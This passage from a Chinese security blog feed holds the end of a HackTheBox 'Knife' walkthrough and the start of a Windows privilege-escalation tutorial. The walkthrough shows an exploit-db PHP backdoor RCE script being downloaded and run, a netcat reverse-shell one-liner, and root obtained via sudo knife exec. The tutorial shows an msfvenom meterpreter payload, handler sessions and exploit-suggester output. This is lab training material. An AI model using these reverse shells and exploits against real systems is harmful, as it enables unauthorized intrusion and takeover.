data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3BocC84LjEtYmFja2Rvb3Iv">详情参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/knife]</span><br><span class="line">└─# whatweb http://10.10.10.242/                                                                                                                              130 ⨯</span><br><span class="line">http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]</span><br></pre></td></tr></table></figure><h2 id="0x05-exploit-db搜索"><a href="#0x05-exploit-db搜索" class="headerlink" title="0x05.exploit-db搜索"></a>0x05.exploit-db搜索</h2><img src="/2021/07/29/HTB-knife/image-20210729151157463.png" class><h2 id="0x06-下载利用"><a href="#0x06-下载利用" class="headerlink" title="0x06.下载利用"></a>0x06.下载利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/raw/49933</span><br><span class="line">mv 49933 php8.1.0.rce.py</span><br><span class="line">┌──(root💀kali)-[~/htb/knife]</span><br><span class="line">└─# python3 php8.1.0.rce.py</span><br><span class="line">Enter the full host url:</span><br><span class="line">http://10.10.10.242</span><br><span class="line"></span><br><span class="line">Interactive shell is opened on http://10.10.10.242</span><br><span class="line">Can&#x27;t acces tty; job crontol turned off.</span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">james</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /home/james/user.txt</span></span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x07-提权"><a href="#0x07-提权" class="headerlink" title="0x07.提权"></a>0x07.提权</h2><h3 id="01-反弹shell"><a href="#01-反弹shell" class="headerlink" title="01.反弹shell"></a>01.反弹shell</h3><p><code>这个shell太难看，反弹个shell回来，kali先监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>目标主机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc your_ip your_port &gt;/tmp/f</span></span><br></pre></td></tr></table></figure><p><code>返回shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666                                                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.242] 34644</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(james) gid=1000(james) groups=1000(james)</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="02-sudo-l提权"><a href="#02-sudo-l提权" class="headerlink" title="02.sudo -l提权"></a>02.sudo -l提权</h3><p><code>sudo -l发现knife命令(点题了。。🏴🏴🏴🏴🏴🏴)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo -l</span></span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>直接敲knife就可以看到他的参数与info，太多了，就列出exec模块</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> knife</span></span><br><span class="line">ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)</span><br><span class="line"></span><br><span class="line">Usage: knife sub-command (options)</span><br><span class="line">    -s, --server-url URL             Chef Infra Server URL.</span><br><span class="line">        --chef-zero-host HOST        Host to start Chef Infra Zero on.</span><br><span class="line">        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.</span><br><span class="line">    -k, --key KEY                    Chef Infra Server API client key.</span><br><span class="line">        --[no-]color                 Use colored output, defaults to enabled.</span><br><span class="line">    -c, --config CONFIG              The configuration file to use.</span><br><span class="line">        --config-option OPTION=VALUE Override a single configuration option.</span><br><span class="line">        --defaults                   Accept default values for all questions.</span><br><span class="line">    -d, --disable-editing            Do not open EDITOR, just accept the data as is.</span><br><span class="line">    -e, --editor EDITOR              Set the editor to use for interactive commands.</span><br><span class="line">    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).</span><br><span class="line">        --[no-]fips                  Enable FIPS mode.</span><br><span class="line">    -F, --format FORMAT              Which format to use for output. (valid options: &#x27;summary&#x27;, &#x27;text&#x27;, &#x27;json&#x27;, &#x27;yaml&#x27;, or &#x27;pp&#x27;)</span><br><span class="line">        --[no-]listen                Whether a local mode (-z) server binds to a port.</span><br><span class="line">    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.</span><br><span class="line">    -u, --user USER                  Chef Infra Server API client username.</span><br><span class="line">        --print-after                Show the data after a destructive operation.</span><br><span class="line">        --profile PROFILE            The credentials profile to select.</span><br><span class="line">    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.</span><br><span class="line">    -v, --version                    Show Chef Infra Client version.</span><br><span class="line">    -y, --yes                        Say yes to all prompts for confirmation.</span><br><span class="line">    -h, --help                       Show this help message.</span><br><span class="line"></span><br><span class="line">Available subcommands: (for details, knife SUB-COMMAND --help)</span><br><span class="line"></span><br><span class="line">************</span><br><span class="line"></span><br><span class="line">** EXEC COMMANDS **</span><br><span class="line">knife exec [SCRIPT] (options)</span><br><span class="line"></span><br><span class="line">** GOOGLE COMMANDS **</span><br><span class="line">knife google disk create NAME --gce-disk-size N (options)</span><br><span class="line">knife google disk delete NAME [NAME] (options)</span><br><span class="line">knife google disk list</span><br><span class="line">knife google image list</span><br><span class="line">knife google project quotas</span><br><span class="line">knife google region list</span><br><span class="line">knife google region quotas</span><br><span class="line">knife google server create NAME -m MACHINE_TYPE -I IMAGE (options)</span><br><span class="line">knife google server delete INSTANCE_NAME [INSTANCE_NAME] (options)</span><br><span class="line">knife google server list</span><br><span class="line">knife google server show INSTANCE_NAME (options)</span><br><span class="line">knife google zone list</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">** YAML COMMANDS **</span><br><span class="line">knife yaml convert YAML_FILENAME [RUBY_FILENAME]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNoZWYuaW8vd29ya3N0YXRpb24va25pZmVfZXhlYy8=">knife参考<i class="fa fa-external-link-alt"></i></span></p><p><code>提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo knife <span class="built_in">exec</span> --<span class="built_in">exec</span> <span class="string">&quot;exec &#x27;/bin/bash -i&#x27;&quot;</span></span></span><br><span class="line">bash: cannot set terminal process group (967): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@knife:/home/james#</span><br><span class="line">root@knife:/home/james# cd</span><br><span class="line">cd</span><br><span class="line">root@knife:~# ls</span><br><span class="line">ls</span><br><span class="line">delete.sh</span><br><span class="line">root.txt</span><br><span class="line">snap</span><br><span class="line">root@knife:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">***************************</span><br><span class="line">root@knife:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/07/29/HTB-knife/image-20210729150203513.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-权限提升</title>
    <link href="https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2021-07-29T06:12:42.000Z</published>
    <updated>2021-07-29T06:18:16.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞发现"><a href="#0x01-漏洞发现" class="headerlink" title="0x01.漏洞发现"></a>0x01.漏洞发现</h2><h3 id="1-WMIC发现安装补丁"><a href="#1-WMIC发现安装补丁" class="headerlink" title="1.WMIC发现安装补丁"></a>1.WMIC发现安装补丁</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="2-msf发现安装补丁"><a href="#2-msf发现安装补丁" class="headerlink" title="2.msf发现安装补丁"></a>2.msf发现安装补丁</h3><p><code>首先使用msfvenom生成恶意程序</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>启动msf监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>运行得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:6666</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.1.4:6666 -&gt; 192.168.1.5:49172) at 2021-07-27                                                                                                   04:35:49 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 5...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  5         meterpreter x86/windows  JIYE\Administrator @ WIN7DC1  192.168.1.4:6666 -&gt; 192.168.1.5:49172 (192.168.1.5)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure><p><code>使用post/windows/gather/enum_patches模块快速扫描缺失的补丁</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /root/.msf4/loot/20210727044047_default_192.168.1.5_enum_patches_596648.txt</span><br><span class="line">[+] KB2534111 installed on 7/10/2021</span><br><span class="line">[+] KB2999226 installed on 7/10/2021</span><br><span class="line">[+] KB4474419 installed on 7/10/2021</span><br><span class="line">[+] KB976902 installed on 11/21/2010</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>使用post/multi/recon/local_exploit_suggester模块找出可能被利用的漏洞</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 5</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 192.168.1.5 - 38 exploit checks are being tried...</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.1.5 - Post interrupted by the console user</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Windows-Exploit-Suggester发现漏洞"><a href="#3-Windows-Exploit-Suggester发现漏洞" class="headerlink" title="3.Windows Exploit Suggester发现漏洞"></a>3.Windows Exploit Suggester发现漏洞</h3><p><code>首先下载数据库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2021-07-27-mssb.xls</span><br><span class="line">[*] done</span><br><span class="line"></span><br><span class="line">E:\&gt;</span><br></pre></td></tr></table></figure><p><code>安装xlrd文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install xlrd==1.2.0</span><br></pre></td></tr></table></figure><p><code>检测</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py -d 2021-07-27-mssb.xls -i systeminfo.txt &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>查看out.txt文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[*] database file detected as xls or xlsx based on extension</span><br><span class="line">[*] attempting to read from the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf-8)</span><br><span class="line">[*] querying database file for potential vulnerabilities</span><br><span class="line">[*] comparing the 4 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits</span><br><span class="line">[*] there are now 386 remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important</span><br><span class="line">[*]   https://github.com/foxglovesec/RottenPotato</span><br><span class="line">[*]   https://github.com/Kevin-Robertson/Tater</span><br><span class="line">[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege</span><br><span class="line">[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-059: Security Update for Windows Media Center (3150220) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-056: Security Update for Windows Journal (3156761) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)</span><br><span class="line">[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important</span><br><span class="line">[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with 